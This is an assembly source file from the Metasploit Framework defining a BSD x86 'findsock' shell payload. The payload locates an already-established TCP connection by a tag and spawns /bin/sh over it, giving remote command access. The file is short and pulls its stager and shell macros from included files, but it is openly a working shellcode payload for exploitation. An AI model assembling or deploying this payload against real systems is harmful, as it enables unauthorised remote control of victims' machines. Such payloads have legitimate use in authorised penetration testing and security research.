;;
; 
;        Name: single_find_tcp_shell
;     Version: $Revision: 1630 $
;     License: 
;
;        This file is part of the Metasploit Exploit Framework
;        and is subject to the same licenses and copyrights as
;        the rest of this package.
;
; Description:
;
;        Single findsock TCP shell.
;
; Meta-Information:
;
; meta-shortname=BSD FindTag Shell
; meta-description=Spawn a shell on an established connection
; meta-authors=skape <mmiller [at] hick.org>
; meta-os=bsd
; meta-arch=ia32
; meta-category=single
; meta-connection-type=findtag
; meta-name=find_shell
; meta-basemod=Msf::PayloadComponent::FindConnection
; meta-offset-findtag=0x1a
;;
BITS   32


%define  USE_SINGLE_STAGE 1

%include "generic.asm"
%include "stager_sock_find.asm"

shell:
	execve_binsh EXECUTE_REDIRECT_IO
